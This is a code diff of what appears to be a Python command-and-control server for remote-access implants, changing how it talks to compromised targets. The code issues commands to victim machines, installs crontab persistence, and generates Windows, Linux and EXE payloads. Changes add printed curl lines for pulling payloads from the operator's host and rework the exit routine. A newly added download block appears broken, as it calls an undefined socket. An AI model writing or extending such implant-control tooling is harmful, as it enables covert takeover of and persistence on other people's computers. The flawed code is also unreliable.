@@ -14,7 +14,6 @@ from Config.design import *
 from Config.commands import *
 
 
-
 def comm_in(targ_id):
     """
     Accepts connection from implants
@@ -66,8 +65,6 @@ def target_comm(targ_id, targets, num):
 
     while True:
         message = input(Fore.YELLOW + f"{targets[num][3]}@{targets[num][1]}$ " + Style.RESET_ALL)
-        if message == 'help' or message == 'h':
-            pass
         if len(message) == 0:
             continue
 
@@ -86,16 +83,8 @@ def target_comm(targ_id, targets, num):
             if message == 'background' or message == 'bg':
                 break
 
-            # Work in progress
-            if message == 'upload' or message == 'up':
-                file_name = input(Fore.BLUE + "[i] Enter File Name: " + Style.RESET_ALL)
-                file = open(file_name, 'rb')
-                file_data = file.read(1024)
-                while file_data:
-                    targ_id.send(file_data)
-                    file_data = file.read(1024)
-                file.close()
-                success("File Uploaded Successfully")
+            if message == 'help' or message == 'h':
+                pass
 
             if message == 'persist' or message == 'pt':
                 payload_name = input(Fore.BLUE + "[i] Enter Payload Name to Persist: " + Style.RESET_ALL)
@@ -118,6 +107,13 @@ def target_comm(targ_id, targets, num):
                     targ_id.send(persist_command.encode())
                     process("Run this command to clean up crontab: \n crontab -r")
                     success("Persistence Technique Completed")
+            try:
+                if message == "download":
+                    sock.send((message).encode())
+                    exist = targ_id.recv(1024).decode()
+            except OSError:
+                error("File does not exist")
+                continue
 
             else:
                 response = comm_in(targ_id)
@@ -157,7 +153,7 @@ def comm_handler():
         try:
             remote_target, remote_ip = sock.accept()
 
-            # Receive Username
+            # Get info from implant
             username = remote_target.recv(1024).decode()  # - 1
             username = base64.b64decode(username).decode()  # encoding
 
@@ -263,6 +259,7 @@ def winplant():
         f.close()
 
     success(f'Payload {file_name} Created at {generated}')
+    info(f"curl http://{host_ip}:PORT/{file_name} -o {file_name}")
 
 
 # Linux Payloads
@@ -298,6 +295,7 @@ def linplant():
         f.close()
 
     success(f'Payload {file_name} Created at {generated}')
+    info(f"curl http://{host_ip}:PORT/{file_name} -o {file_name}")
 
 
 # EXE Payloads
@@ -351,6 +349,7 @@ def exeplant():
     try:
         if os.path.exists(f'Generated Payloads/{ran_name}.exe'):
             success(f"Executable Generated to Generated Payloads Directory: {exe_file}")
+            info(f"curl http://{host_ip}:PORT/{file_name} -o {file_name}")
 
         else:
             error(f"Executable Generation Failed")
@@ -394,11 +393,6 @@ if __name__ == "__main__":
     # Target List Store
     targets = []
     banner()
-    # Create Payloads Directory
-    if not os.path.exists('Generated Payloads'):
-        process("Creating Generated Payloads Directory...")
-        os.mkdir('Generated Payloads')
-        success("Generated Payloads Directory Created")
 
     # Count Variables
     kill_flag = 0
@@ -441,8 +435,31 @@ if __name__ == "__main__":
                         exeplant()
                     else:
                         error("Generate Listener First")
-                case ('exit' | 'quit'):
-                    exit()
+                case ('exit'):
+                    quit_message = input(
+                        Fore.LIGHTRED_EX + "\n[!] Are you sure you want to quit? (yes/no): " + Style.RESET_ALL).lower()
+                    if quit_message == 'y' or quit_message == 'yes':
+                        tar_length = len(targets)
+                        # Delete Payloads
+                        process("Deleting Payloads")
+                        try:
+                            if os.path.exists('Generated Payloads'):
+                                shutil.rmtree('Generated Payloads')
+                        except PermissionError:
+                            error("Permission Denied - Payload is still running")
+                            break
+                        for target in targets:
+                            if target[7] == 'Dead':
+                                pass
+                            else:
+                                comm_out(target[0], 'exit')
+                        kill_flag = 1
+                        if listener_counter > 0:
+                            sock.close()
+                        quit("Quitting...")
+                        break
+                    else:
+                        continue
 
             # Generate Sessions Commands
             if command.split(" ")[0] == 'sessions':
@@ -505,8 +522,6 @@ if __name__ == "__main__":
                         error(f"Session {num} does not exist")
                     except NameError:
                         continue
-
-
 
         except KeyboardInterrupt:
             quit_message = input(
